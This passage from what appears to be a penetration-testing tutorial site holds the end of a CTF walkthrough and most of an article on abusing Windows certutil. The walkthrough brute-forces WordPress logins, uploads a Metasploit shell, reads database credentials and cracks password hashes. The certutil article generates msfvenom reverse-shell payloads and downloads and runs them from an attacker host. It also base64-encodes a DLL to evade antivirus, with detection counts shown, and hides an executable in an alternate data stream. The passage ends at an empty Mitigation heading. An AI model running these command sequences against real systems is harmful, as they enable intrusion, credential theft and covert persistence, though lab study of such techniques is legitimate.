We then tried to upload a simple .php file and when uploading a .php file we come across the following error :  
![](https://i0.wp.com/1.bp.blogspot.com/-41t2wGnhNHg/Xe0d3dgb0AI/AAAAAAAAh1Q/SqK-P8LO6Pc_LNp3BGdeSGJ9YOex29z_QCEwYBhgL/s1600/8.png?w=687&ssl=1)  
But this error leads us to a new page “upload.php”. Let’s check the source code of this page.  
![](https://i1.wp.com/1.bp.blogspot.com/-sT-h9xniBm8/Xe0d3k4UjpI/AAAAAAAAh1Q/0FSP0vSSKowyn5nmlB7QaWUSJmlq3FjCACEwYBhgL/s1600/9.png?w=687&ssl=1)  
Yes! There is a comment at the end of the source code. And this is a base64 encoded text, so let’s try to decode it by using the following command :  

echo c28tZGV2LXdvcmRwcmVzcw== | base64 -d

1

echo c28tZGV2LXdvcmRwcmVzcw\==  |  base64  \-d

![](https://i0.wp.com/1.bp.blogspot.com/-kSRTBj9izhM/Xe0dtkf5dgI/AAAAAAAAh1A/ZmupdkyzdhsJ17_RVKfo6Wqpw_QDpRDnACEwYBhgL/s1600/10.png?w=687&ssl=1)  
When the text is decoded, it looks like a directory or a webpage. But before exploring it let’s see if there are more pages or not. Hence, use dirbuster.  
![](https://i0.wp.com/1.bp.blogspot.com/-qfGsI0-lGtU/Xe0dtptsFrI/AAAAAAAAh1E/uhCqzSVnZLYNz5Wq7jA8w5mYuiZzSkilACEwYBhgL/s1600/11.png?w=687&ssl=1)  
There are many pages and as the result shows us that CMS is wordpress, therefore, we can use wpscan to plow through the two specified pages that mentions wordpress. And for that use the following command :  

wpcan --url "http://192.168.43.8/wordpress" --enumerate

1

wpcan  \--url  "http://192.168.43.8/wordpress"  \--enumerate

![](https://i1.wp.com/1.bp.blogspot.com/-79bUxxMV-DY/Xe0du5zliBI/AAAAAAAAh1U/1yACRnXyQWoU5Py74erIcUSXkzNm04IDwCEwYBhgL/s1600/12.png?w=687&ssl=1)  
Similarly, let’s enumerate the other page.  

wpcan --url "http://192.168.43.8/so-dev-wordpress" --enumerate

1

wpcan  \--url  "http://192.168.43.8/so-dev-wordpress"  \--enumerate

![](https://i0.wp.com/1.bp.blogspot.com/-NfmPDkBkb9E/Xe0duwBwcaI/AAAAAAAAh1M/cngjfO-TzZgeU7aAbnGvwUSpx4hnmc7vQCEwYBhgL/s1600/13.png?w=687&ssl=1)  
As you can see in the above image there are three users. And we have their usernames, we can simply use bruteforce to find their respective passwords and for that type :  

wpscan --url "http://192.168.43.8/wordpress" -U bossperson -P /usr/share/wordlists/dirb/common.txt

1

wpscan  \--url  "http://192.168.43.8/wordpress"  \-U  bossperson  \-P  /usr/share/wordlists/dirb/common.txt

![](https://i1.wp.com/1.bp.blogspot.com/-Nxo4QhKMsf0/Xe0du7SAQeI/AAAAAAAAh08/SP4roR10X0IDnRKyh9X-z7qxvLCjwhE8QCEwYBhgL/s1600/14.png?w=687&ssl=1)  
Alas, we couldn’t find any password but not to worry as we can run the same command for the other page, let’s try it by typing :  

wpscan --url "http://192.168.43.8/so-dev-wordpress" -U admin,mike -P /usr/share/wordlists/dirb/common.txt

1

wpscan  \--url  "http://192.168.43.8/so-dev-wordpress"  \-U  admin,mike  \-P  /usr/share/wordlists/dirb/common.txt

![](https://i1.wp.com/1.bp.blogspot.com/-Nxo4QhKMsf0/Xe0du7SAQeI/AAAAAAAAh08/SP4roR10X0IDnRKyh9X-z7qxvLCjwhE8QCEwYBhgL/s1600/14.png?w=687&ssl=1)  
And so, we finally found the password for the user admin. So now, let’s try to upload a shell using msfconsole. And through Metasploit we will use **exploit/unix/webapp/wp\_admin\_shell\_upload**.  
![](https://i0.wp.com/1.bp.blogspot.com/-2BfMqwpo9yc/Xe0ieSH9IVI/AAAAAAAAh10/oWVM47tFdPMPJ-W8EBQ5_jOU8zjD5rCkwCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)  
Once the exploit is initiated, type the set of following commands :  

set PASSWORD admin set RHOST 192.168.43.8 set USERNAME admin set TARGETURI /so-dev-wordpress exploit

1

2

3

4

5

set PASSWORD admin

set RHOST  192.168.43.8

set USERNAME admin

set TARGETURI  /so\-dev\-wordpress

exploit

![](https://i0.wp.com/1.bp.blogspot.com/-AWHHm4mVWMI/Xe0ieuZMIKI/AAAAAAAAh14/JAqDbdOigjIL_uq3G6igzZPB64gZdGMXACLcBGAsYHQ/s1600/17.png?w=687&ssl=1)  
As you can see, we are successful in getting our session, let’s move onto shell of the target system and for that type shell and hit enter. And the next thing you know is you are in the shell of the target system. Now to get a proper authenticated session of shell type the following command :  

python3 -c 'import pty;pty.spawn("/bin/sh")'

1

python3  \-c  'import pty;pty.spawn("/bin/sh")'

![](https://i0.wp.com/1.bp.blogspot.com/-WZTNuoOCnms/Xe0ie_8uSQI/AAAAAAAAh18/9QvbubQUSWYZzmWnumSe5QJDkCGG_KajACLcBGAsYHQ/s1600/18.png?w=687&ssl=1)  
As we have managed to get a shell. So now, we will explore the system more to find some useful files.  
![](https://i0.wp.com/1.bp.blogspot.com/-QtmPzku1_FU/Xe0ifYXLYMI/AAAAAAAAh2A/sEJQZVcnjvoYedIEZUIX6J1ulRmwybozwCLcBGAsYHQ/s1600/19.png?w=687&ssl=1)  
Upon changing the directory, we found wp-config.php. as it is a config file, there’s bound to be useful information. Thus, we will try to read it’s content using the cat command :  

cat wp-config.php

1

cat wp\-config.php

![](https://i0.wp.com/1.bp.blogspot.com/-PYSpgvs99Ss/Xe0if7ljCYI/AAAAAAAAh2I/B1BYOlI1CcALJwb4OL4WJtE4tJ4nfHNCACLcBGAsYHQ/s1600/20.png?w=687&ssl=1)  
These credentials are of MySQL as you can see the prefix DB used which probably stands for the database. So, we can try to login into mysql using these credentials and therefore, use the following commands :  

bash mysql -u sodevwp -p

1

2

bash

mysql  \-u  sodevwp  \-p

![](https://i0.wp.com/1.bp.blogspot.com/-wDRUFyH1ZkY/Xe0igfA1pcI/AAAAAAAAh2M/ix0MozKiRk0ho0r09MHXvFbWoHqgBTCfgCLcBGAsYHQ/s1600/21.png?w=687&ssl=1)  
Yes, we are in! Let’s try and explore it further.  
![](https://i0.wp.com/1.bp.blogspot.com/-i3DwmJ_AXk8/Xe0ihDFKu8I/AAAAAAAAh2Q/hML-kBUPQkIeDBbQQQY5xAl9Ll0AScj-gCLcBGAsYHQ/s1600/22.png?w=687&ssl=1)  
We found a database “sodevwp” and hence, to change the database type :  

show databases; use sodevwp show tables; select \* from sodevwp\_users;

1

2

3

4

show databases;

use  sodevwp

show tables;

select \*  from sodevwp\_users;

![](https://i2.wp.com/1.bp.blogspot.com/-MsCCPz-gIhs/Xe0ihblrwCI/AAAAAAAAh2U/ygjKeim6FAsy9PBoJnKumOIQ-q2GuzlqQCLcBGAsYHQ/s1600/23.png?w=687&ssl=1)  
Once the above commands are used successfully, you will find the following two hashes :  
**$P$BD/ZmfBIhgjHKtkLpPKfhr2t5EDgZA. (for user admin)**  
**$P$B3halPOgh4jqI1tDelkv5TGAHnaOC01 (for user mike)**  
![](https://i1.wp.com/1.bp.blogspot.com/-4wCIuofw6qc/Xe0ihqgwe3I/AAAAAAAAh2Y/1pJm64pKPJoR2g2jkF-VPPQDyDrc8BcUACLcBGAsYHQ/s1600/24.png?w=687&ssl=1)  
We will now use john the riper with rockyou wordlist to crack these hashes and for that type :  

john cracker -wordlist=/usr/share/wordlists/rockyou.txt

1

john cracker  \-wordlist\=/usr/share/wordlists/rockyou.txt

![](https://i1.wp.com/1.bp.blogspot.com/-4wCIuofw6qc/Xe0ihqgwe3I/AAAAAAAAh2Y/1pJm64pKPJoR2g2jkF-VPPQDyDrc8BcUACLcBGAsYHQ/s1600/24.png?w=687&ssl=1)  
As you can see in the image above that we found our passwords to the two major users and those are :  
**admin:admin1**  
**mike: skuxdelux**  
Now, try and switch the user to mike and you can observe in the image below that you can successfully do that; which means cracking the passwords was successful.  
![](https://i1.wp.com/1.bp.blogspot.com/-R0Wvwx9MXDY/Xe0iiopWysI/AAAAAAAAh2g/CXg7CQIOfckf3a5b48LiCBk8hT3zD_ouwCLcBGAsYHQ/s1600/26.png?w=687&ssl=1)  
Let’s move on for privilege escalation. Now, when you change your directory to /home and there you found a new user **“joe”**  
And without wasting any time we traversed through **etc/passwd**.  
![](https://i1.wp.com/1.bp.blogspot.com/-R0Wvwx9MXDY/Xe0iiopWysI/AAAAAAAAh2g/CXg7CQIOfckf3a5b48LiCBk8hT3zD_ouwCLcBGAsYHQ/s1600/26.png?w=687&ssl=1)  
With etc/passwd we found out that password to **‘joe’** is **SmashMouthNoThanks**. So now, let’s switch the user to joe with the foretold password.  
![](https://i1.wp.com/1.bp.blogspot.com/-R0Wvwx9MXDY/Xe0iiopWysI/AAAAAAAAh2g/CXg7CQIOfckf3a5b48LiCBk8hT3zD_ouwCLcBGAsYHQ/s1600/26.png?w=687&ssl=1)  
And just like that, we have access to the user ‘joe’.  
Now to move forward the only thing we have to do is to get the last flag of the target. And to get it we check for **SUID** using the command find. -perm /4000. Before executing this command, we will change our directory to “/” and after running the command we find the following useful binaries.  
![](https://i1.wp.com/1.bp.blogspot.com/-R0Wvwx9MXDY/Xe0iiopWysI/AAAAAAAAh2g/CXg7CQIOfckf3a5b48LiCBk8hT3zD_ouwCLcBGAsYHQ/s1600/26.png?w=687&ssl=1)  
And in **/bwrap** we found our last flag which you can observe from the image below :  
![](https://i0.wp.com/1.bp.blogspot.com/-DEH_iF05O50/Xe0ij5SZhFI/AAAAAAAAh20/gBFPeBDapREAwi3-10GzzY54j5_LSt5FgCLcBGAsYHQ/s1600/30.png?w=687&ssl=1)  
Read the flag using cat command as shown in the image below :  
![](https://i0.wp.com/1.bp.blogspot.com/-aMXwRFiKERg/Xe0ik4QrKfI/AAAAAAAAh24/8E9dR1aggBwx23NtLv-6QDGjAyqT4g1uQCLcBGAsYHQ/s1600/31.png?w=687&ssl=1)  
VOILA!! We have completed the challenge.  
**Author: Yash Saxena **an undergraduate student pursuing B. Tech in Computer science and engineering with a specialization in cybersecurity and forensics from DIT University, Dehradun.** Contact ****[here](https://www.linkedin.com/in/yash-saxena-412349161/)**.  

[Windows for Pentester: Certutil](https://www.hackingarticles.in/windows-for-pentester-certutil/)
=================================================================================================

posted in[Red Teaming](https://www.hackingarticles.in/category/red-teaming/) on [December 3, 2019](https://www.hackingarticles.in/windows-for-pentester-certutil/ "9:18 am") by [Raj Chandel](https://www.hackingarticles.in/author/raaz/ "View all posts by Raj Chandel") with [2 Comments](https://www.hackingarticles.in/windows-for-pentester-certutil/#comments)

In this article, we are going to describe the utility of Certutil tool and how vital it is in Windows Penetration Testing.  

### **TL; DR**

Certutil is a preinstalled tool on Windows OS that can be used to download malicious files and evade Antivirus. It is one of the Living Off Land (LOL) Binaries.  

### **Disclaimer**

The main objective of publishing the series of “Windows for Pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any Pentester while solving CTF challenges or OSCP labs which are based on Windows Operating System. Here, we do not criticize any kind of misconfiguration that a network or system administrator does for providing higher permissions on any kind of programs/binaries/files & etc.”  

### **Table of Content**

*   **Introduction**
    *   What is certutil?
    *   What is Living off Land?
    *   Working with certutil?
    *   What is Alternative Data Stream (ADS)?
*   **Configurations used in Practical**
*   **Working with certutil**
    *   Encoding
    *   Decoding
    *   Hashing
    *   Downloading
    *   Reading Error Code
*   **Penetration Testing using certutil**
    *   Compromising using Malicious Executable
    *   Compromising with Encoded Malicious DLL
    *   Compromising with Malicious Executable inside ADS
*   **Mitigation**
*   **Conclusion**

### **Introduction**

### **What is Certutil?**

Certutil is a CLI program that can be used to dump and display certificate authority (CA), configuration information, configures Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains. It is installed as a part of Certificate Services.  

### **What is Living off Land?**

In simple words, it is an attack that works on the idea of using system tools as backdoors. File-less attack is another example of LOL attack. Attackers who use this tactic works with trusted, in most cases, preinstalled system tools to carry out their attack. Attackers use these tactics to hide their malicious activity in plain sight among the other general activity inside the network or system. As these kinds of attacks operate without triggering any alerts, it is almost impossible for investigators to determine who is behind the said malicious activity even if they discover it.  

### **What is Alternative Data Stream (ADS)?**

The NTFS file system consists of the ADS feature. This is an inconspicuous feature that was included, to provide compatibility with files in the Macintosh file system. ADS enable files to incorporate more than one stream of data. In any instance, each file consists of at least one data stream. This default data stream in Windows is recognized as :$DATA.  
Windows Explorer can’t see what ADSs are in a file (or a way to erase them without actually discarding the original file) but they can be created and accessed with ease. Because they are challenging to detect, thus often used by hackers to hide files on machines that they’ve compromised. Executables in ADSs can be executed from the command line but without showing up in Windows Explorer.  
Some of the CTF Challenges over HackTheBox where certutil can be used are:  
**Access, Arctic, BigHead, Conceal, Ethereal, Fighter, Giddy, Hackback, Jerry, Rabbit.**  

### **Configurations used in Practical**

**Attacker:**  

*   **OS:** Kali Linux 2019.4
*   **IP:**192.168.1.10

**Target:**  

*   **OS:** Windows 10 (Build 18363)
*   **IP:** 192.168.1.11

### **Working with certutil**

### **Practical #1: Encoding**

Certutil contains an encode parameter. It could help to encode file content into Base64. This is a Windows equivalent to the base64 command in Linux.  
When working with an executable file, we came across a scenario. In it, the uploading of the executable file was not smooth. We can use certutil to encode the executable file. Then transfer the encoded data, then decode it on the recipient machine.  
In the following practical, we first created a text file named “file.txt” and wrote the “This is a plain text” line in it. We did this with Add-Content cmdlet in PowerShell. We can see that it worked when we checked the file using type command. To convert, we will use certutil with encode parameter. We will provide the text file and the file that it should write the encoded data.  
Certutil adds two segments “BEGIN CERTIFICATE” and “END CERTIFICATE”. The converted contents of the file are between these two segments. We can check the encoded text using the type command.  

Add-Content file.txt "This is a plain text" type .\\file.txt certutil -encode file.txt encoded.txt type .\\encoded.txt

1

2

3

4

Add\-Content file.txt  "This is a plain text"

type  .\\file.txt

certutil  \-encode file.txt encoded.txt

type  .\\encoded.txt

![](https://i2.wp.com/1.bp.blogspot.com/-5Jw3riPCOJ4/XeYjBwyl7BI/AAAAAAAAhxQ/EssLCnZ_uYwcdqvf6fUBuqgK_A9_dP1WACLcBGAsYHQ/s1600/1.png?w=687&ssl=1)  
We can use the parameter -encodehex to convert data into Hex encoded files.  

### **Practical #2: Decoding**

Certutil can decode the data encoded in Base64. Let’s show you a quick method from which you can decode the data. We will be using the file that we encoded in the previous practical. We will use certutil with -decode parameter. Then provide the encoded file and the file it should write the decoded data. We can check the decoded text using the type command.  

type .\\encoded.txt certutil -decode encoded.txt decoded.txt type .\\decoded.txt

1

2

3

type  .\\encoded.txt

certutil  \-decode encoded.txt decoded.txt

type  .\\decoded.txt

![](https://i0.wp.com/1.bp.blogspot.com/-B1x59959I7U/XeYjFjWEiNI/AAAAAAAAhx8/diX2cBJarXUB85t9FuUG2b32f_V9UOWTgCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)  
We can use the parameter -decodehex to decode the Hex encoded files.  

### **Practical #3: Hashing**

Hashing means taking data and giving out an output string of a fixed length. Using the cryptography hashing algorithms — e.g., MD5, SHA-1, SHA-256, you can verify if two files are identical or not. The checksum is a hash value used for performing data integrity checks. It’s a kind of signature for a file. By comparing checksum, we can identify duplicate files.  
Time to generate some hashes. We will use the file.txt we created earlier. First, we will generate the MD5 hash using certutil parameter -hashfile. With the parameter, file path and algorithm we can hash the file.  
![](https://i1.wp.com/1.bp.blogspot.com/-bl15zdvsjEw/XeYjG9PyTbI/AAAAAAAAhyM/tu2eC9YPtcoKC_xPrpG4MFul3w8qUFokACLcBGAsYHQ/s1600/3.png?w=687&ssl=1)  

certutil -hashfile ".\\file.txt" md5 certutil -hashfile ".\\file.txt" sha1 certutil -hashfile ".\\file.txt" sha256

1

2

3

certutil  \-hashfile  ".\\file.txt"  md5

certutil  \-hashfile  ".\\file.txt"  sha1

certutil  \-hashfile  ".\\file.txt"  sha256

**NOTE:** While working with Systems like Windows 7, keep in mind that the hash algorithms are case-sensitive. Be sure to type, for example, “MD5”, not “md5”.  

### **Practical #4: Downloading**

In scenarios, where wget, BITSAdmin or any other convention method is blocked. Certutil can be used to download files from the internet. We will be downloading 7zip.exe from the 7zip server as shown in the image.  

\-URLCache

Display or delete URL cache entries

\-split

Split embedded ASN.1 element & Save to files

\-f

Force Overwrite

certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe dir

1

2

certutil.exe  \-urlcache  \-split  \-f  http://7-zip.org/a/7z1604-x64.exe 7zip.exe

dir

### ![](https://i0.wp.com/1.bp.blogspot.com/-gQCPrKOCx8g/XeYjHX49HXI/AAAAAAAAhyQ/9WTE493osgkmpttEIGaZzxF29rAEOjNGwCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

### **Practical #5: Reading Error Code**

Suppose you got a system error code without any message. You don’t have any source to look up the meaning of the error. This is a common scenario. Certutil can help to look up the message text for system error codes.  

certutil -error 8200 certutil -error 0x200

1

2

certutil  \-error  8200

certutil  \-error  0x200

![](https://i0.wp.com/1.bp.blogspot.com/-7JgRsWB--mM/XeYjHtci_sI/AAAAAAAAhyU/hMnaRbW0ancNEt5dw4dkFW2VPoIF_tijQCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)  
**NOTE:** Certutil can perform many more functions related to CA Certificates but we will be focusing on Penetration Testing for now.  

### **Penetration Testing using certutil**

### **Practical #6: Compromising using Malicious Executable**

During our initial assessment, we saw that the certutil was actively downloading files from the internet without any kind of verification or assessment. This is an instance that is part of the [**MITRE | ATT&CK Remote File Copy Tactic**](https://attack.mitre.org/techniques/T1105/)**.**  
Certutil can be used to copy a file from one system to another to stage some attacking tools or other files throughout an attack. Files can also be transferred from an outer attacker-controlled system through a Command and Control Channel to bring tools or scripts into the target network to support Lateral Movement.  
In the previous practical, we downloaded a file from a remote server. Let’s see how we can compromise a Windows System using a Malicious Executable.  
We started our attack with Exploit Development. We used the msfvenom tool to generate a Payload for a Reverse TCP Connection to our attacker machine. We provided the msfvenom with the appropriate LHOST and LPORT. The format of the payload was set to an Executable(.exe) File. We named it “shell.exe”. After successful execution, the file was created in our “/root” directory. Now to transfer the newly generated we decided to use the HTTP Server generated by a Python One-liner.  

msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.1.10 lport=1234 -f exe > shell.exe python -m SimpleHTTPServer 80

1

2

msfvenom  \-p  windows/meterpreter/reverse\_tcp lhost\=192.168.1.10  lport\=1234  \-f  exe  \>  shell.exe

python  \-m  SimpleHTTPServer  80

![](https://i1.wp.com/1.bp.blogspot.com/-THXLxeRgaNc/XeYjH4LXDjI/AAAAAAAAhyY/FExgVEQEAUMqRM3TbG6-cgC2RzR51AM6ACLcBGAsYHQ/s1600/6.png?w=687&ssl=1)  
Now that the payload is hosted on the server, before executing the payload on the Target Machine, we need to start a Listener on Attacker Machine to capture the meterpreter session that would be generated after the execution of the payload.  

use exploit/multi/handler set payload windows/meterpreter/reverse\_tcp set lhost 192.168.1.10 set lport 1234 exploit

1

2

3

4

5

use  exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost  192.168.1.10

set lport  1234

exploit

![](https://i1.wp.com/1.bp.blogspot.com/-NQuhpkuhCQo/XeYjIFAJD1I/AAAAAAAAhyc/q_HUAN5PEBgUfzqnRIxTeWRf4mcdyqovQCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)  
After successfully starting a listener on the Attacker, its time to move to Target Machine. Here, we have a PowerShell Terminal. We need to download the payload to this machine. We will use certutil to fetch it. Certutil will make two connections to the remote web server using two different User-Agents. They will be named “Microsoft-CryptoAPI” and “Certutil URL Agent”.  
**NOTE:** During our assessment, we found that upon execution the above command an Access Denied Error is notified. Using -verifyCTL instead of -URLCache will let you bypass this error.  
After the successful transfer of the Payload to Target Machine. We executed the payload as shown in the image.  

certutil.exe -urlcache -split -f http://192.168.1.10/shell.exe shell.exe .\\shell.exe

1

2

certutil.exe  \-urlcache  \-split  \-f  http://192.168.1.10/shell.exe shell.exe

.\\shell.exe

![](https://i1.wp.com/1.bp.blogspot.com/--mUngj31shw/XeYjIhnJjNI/AAAAAAAAhyg/4sBJEYKmCl4xddeLlnQGZOEf2oRiCwm2gCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)  
We went back to our Attacker Machine to see that a meterpreter instance is generated and captured by our listener. We run sysinfo to see the details of the Target System.  

sysinfo

1

sysinfo

![](https://i0.wp.com/1.bp.blogspot.com/-bHb-vjClhLM/XeYjIz4A1xI/AAAAAAAAhyk/zLlKI7azBmA3s-7lqeCexwV12RTMMafhACLcBGAsYHQ/s1600/9.png?w=687&ssl=1)  
We have successfully Compromised the Target Machine using a combination of Certutil and a Malicious Executable.  

### **Practical #7: Compromising with Encoded Malicious DLL**

As seen earlier Certutil encodes file content into Base64. This opens up a lot of possibilities. This is an instance that is part of [MITRE | ATT&CK Deobfuscate/Decode Files or Information Tactic](https://attack.mitre.org/techniques/T1140/).  
Attackers can use Obfuscated (Difficult to detect/find) Files to conceal evidence of an attack from the analysis. Afterward, they may Deobfuscate (Unhide) those files. This is where certutil comes into the picture. It can decode the data and help bypass Antivirus, IDS/IPS Software. Certutil can also be used to decode a portable executable file that has been hidden inside a certificate file.  
Payloads may be compressed, archived, or encrypted to avoid detection. These payloads may be used with Obfuscated Files or Information during Initial Access or later to mitigate detection. Sometimes a user’s action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the attacker. Now onto our Practical.  
We started our attack with Exploit Development. We used the msfvenom tool to generate a Payload for a Reverse TCP Connection to our attacker machine. We provided the msfvenom with the appropriate LHOST and LPORT. The format of the payload was set to a Dynamic-Link Library(.dll) File. We named it “dll.txt”. We can name it any other name which is less suspicious. We use the text file so that it doesn’t rise any unnecessary flags. After successful execution, the file was created in our “/root” directory. Now to transfer the newly generated we decided to use the HTTP Server generated by a Python One-liner.  

msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.1.10 lport=1234 -f dll > dll.txt python -m SimpleHTTPServer 80

1

2

msfvenom  \-p  windows/meterpreter/reverse\_tcp lhost\=192.168.1.10  lport\=1234  \-f  dll  \>  dll.txt

python  \-m  SimpleHTTPServer  80

![](https://i0.wp.com/1.bp.blogspot.com/-mfyGepX6wvM/XeYjCJmf3II/AAAAAAAAhxY/ZkDdJJS1eCow7v9rF1WWbG1mhKX_YgR9gCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)  
Now that the payload is hosted on the server, before executing the payload on the Target Machine, we need to start a Listener on Attacker Machine to capture the meterpreter session that would be generated after the execution of the payload.  

use exploit/multi/handler set payload windows/meterpreter/reverse\_tcp set lhost 192.168.1.10 set lport 1234 exploit

1

2

3

4

5

use  exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost  192.168.1.10

set lport  1234

exploit

![](https://i1.wp.com/1.bp.blogspot.com/-4Y5hJ3E21wQ/XeYjCOCzjoI/AAAAAAAAhxU/9JLYOnAInLo3Dzp74344waBAzLFVedyggCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)  
After successfully starting a listener on the Attacker, it times to move to Target Machine. Here, we have a PowerShell Terminal. We need to download the payload to this machine and we need to do this discreetly. We run certutil with a combination of URLCache and encode separated by the pipe (|). Now the file will be downloaded as a text file and gets encoded as another text file which we named “edll.txt” for encoded DLL.  

certutil -urlcache -split -f http://192.168.1.10/dll.txt dll.txt | certutil -encode dll.txt edll.txt

1

certutil  \-urlcache  \-split  \-f  http://192.168.1.10/dll.txt dll.txt | certutil -encode dll.txt edll.txt

![](https://i1.wp.com/1.bp.blogspot.com/-MSaTBsq7oYQ/XeYjC4VteCI/AAAAAAAAhxc/4OsjmI8zdIo6YctvYK3MjRIghnDVUYB7ACLcBGAsYHQ/s1600/12.png?w=687&ssl=1)  
Now to execute the payload to compromise the target, we need to decode it. We use the decode parameter in certutil to decode the payload and saved it as “exploit.dll”. Now to execute this DLL we decide to use regsvr32. It executes DLL directly into memory.  

certutil -decode .\\edll.txt exploit.dll regsvr32 /s /u .\\exploit.dll

1

2

certutil  \-decode  .\\edll.txt exploit.dll

regsvr32  /s  /u  .\\exploit.dll

![](https://i1.wp.com/1.bp.blogspot.com/-NtA79N7jP_8/XeYjDKomFtI/AAAAAAAAhxg/V50KDX3lXe0HaQj8Qkkx-aO59FwAQykjwCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)  
We went back to our Attacker Machine to see that a meterpreter instance is generated and captured by our listener. We run sysinfo to see the details of the Target System. We have successfully Compromised the Target Machine using a combination of Certutil and an Encoded Malicious Executable.  

sysinfo

1

sysinfo

![](https://i1.wp.com/1.bp.blogspot.com/-faJOfKCoph4/XeYjDQoWY6I/AAAAAAAAhxk/I5G9qoCgSbYsCBY1eXBmXM438RKlrk-egCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)  
As we talked about evading Antivirus Software. Let’s inspect the files that we generated and used in the attempt to compromise the target. We use VirusTotal for this analysis. We first inspect the “dll.txt”. Upon successful upload and analysis of the dll.txt, we see that it was detected by 54 out of 67 Antivirus Engines. That can’t be good.  
![](https://i0.wp.com/1.bp.blogspot.com/-W73tY-e5yzk/XeYjD4yPMNI/AAAAAAAAhxo/LQiSDDs8Hb4byq73Gb329ZefnFJpwyGlQCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)  
So, the inspection of the dll.txt file was not acceptable. Now let’s test the file we encoded using certutil. We uploaded the edll.txt. Upon analysis of the edll.txt, we see that it was detected by 4 out of 56 Antivirus Engines. It is not perfect but it is a huge difference.   
![](https://i0.wp.com/1.bp.blogspot.com/-DdXnWV77_ls/XeYjD5aELYI/AAAAAAAAhxs/1qLgrry5GIEatRNUDt48m0nLHp_6dVU-wCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)  
Another flavour of this attack can be as depicted below:  
We create a payload in the form of an executable(payload.exe). Then we use certutil to encode it to a specific binary. For example, “payload.enc”. Then post the output of the encoding process on Github, Pastebin or other alternative services. The purpose of this procedure is to separate the encoded payload from the stager to avoid detection. Now use the certutil on the target machine to download the content from the remote server (Github/Pastebin). Finally, decode the malicious payload into an executable extension using Certutil and execute it to compromise the Target.  

### **Practical #8: Compromising with Malicious Executable inside ADS**

We started our attack with Exploit Development. We used the msfvenom tool to generate a Payload for a Reverse TCP Connection to our attacker machine. We provided the msfvenom with the appropriate LHOST and LPORT. The format of the payload was set to an Executable(.exe) File. We named it “virus.exe”. After successful execution, the file was created in our “/root” directory. Now to transfer the newly generated we decided to use the HTTP Server generated by a Python One-liner.   

msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.1.10 lport=443 -f exe > "virus.exe" python -m SimpleHTTPServer 80

1

2

msfvenom  \-p  windows/meterpreter/reverse\_tcp lhost\=192.168.1.10  lport\=443  \-f  exe  \>  "virus.exe"

python  \-m  SimpleHTTPServer  80

![](https://i2.wp.com/1.bp.blogspot.com/-bPUMAxjS0Nk/XeYjEZd-AlI/AAAAAAAAhxw/LrBPJFaGTJIThO8INizoHFQchJD-jsmLgCLcBGAsYHQ/s1600/17.png?w=687&ssl=1)  
Now that the payload is hosted on the server, before executing the payload on the Target Machine, we need to start a Listener on Attacker Machine to capture the meterpreter session that would be generated after the execution of the payload.  

use exploit/multi/handler set payload windows/meterpreter/reverse\_tcp set lhost 192.168.1.10 set lport 1234 exploit

1

2

3

4

5

use  exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost  192.168.1.10

set lport  1234

exploit

![](https://i0.wp.com/1.bp.blogspot.com/-XxD9cNOl7RQ/XeYjE7wIHCI/AAAAAAAAhx0/ez3t2z1K89oJU5ubmiE3AseEnyputTEYACLcBGAsYHQ/s1600/18.png?w=687&ssl=1)  
This time we will use a different approach altogether. We are going to use the Alternative Data Stream. Alternative Data Stream (ADS) was created by Microsoft to supporting compatibility with Apple McIntosh’s file system. In the Mac, files have a huge amount of metadata in addition to regular data. To save the exe file into ADS, we need to specify the name of the file in whose ADS we want to save another file, then (:) followed by name and extension of another file. As shown, we saved the virus.exe inside the ADS of harmless.txt file.  

certutil.exe -urlcache -split -f http://192.168.1.10/virus.exe harmless.txt:virus.exe

1

certutil.exe  \-urlcache  \-split  \-f  http://192.168.1.10/virus.exe harmless.txt:virus.exe

![](https://i1.wp.com/1.bp.blogspot.com/-G4sBWwpD8Ng/XeYjFbDsZgI/AAAAAAAAhx4/CP1NwMKllnI_JcKapwGB0esNNRP32KebgCLcBGAsYHQ/s1600/19.png?w=687&ssl=1)  
Here, it can be observed that there is no file named virus.exe in the directory and the size of harmless.txt is 0 as well as it contains nothing as it was an originally an empty text file.  

dir type .\\harmless.txt

1

2

dir

type  .\\harmless.txt

![](https://i0.wp.com/1.bp.blogspot.com/-Wce7FfUhO8I/XeYjFjIrebI/AAAAAAAAhyA/X5a0f-Effaw7vQ5Hf2ahrGE6Y9_GpkqXACLcBGAsYHQ/s1600/20.png?w=687&ssl=1)  
Now to execute the file that we put in the ADS; we will be using wmic. We will use the create flag followed by the path of the payload as shown in the image. It says that the Execution was successful.  

wmic process call create "c:\\harmless.txt:virus.exe"

1

wmic process call create  "c:\\harmless.txt:virus.exe"

![](https://i1.wp.com/1.bp.blogspot.com/-v142bn1hWm0/XeYjGaD0STI/AAAAAAAAhyE/JnAEOdjH43MYpSpH8AsLIP8vyhazEKtUwCLcBGAsYHQ/s1600/21.png?w=687&ssl=1)  
We went back to our Attacker Machine to see that a meterpreter instance is generated and captured by our listener. We run sysinfo to see the details of the Target System.  

sysinfo

1

sysinfo

![](https://i0.wp.com/1.bp.blogspot.com/-IeEfxmIIk0M/XeYjGg0HhBI/AAAAAAAAhyI/w6V-5YgB0ugJXI29P8_7pqgiFytmj3r0ACLcBGAsYHQ/s1600/22.png?w=687&ssl=1)  
We have successfully Compromised the Target Machine using a combination of Certutil and a Malicious Executable concealed in Alternative Data Stream.  

### **Mitigation**

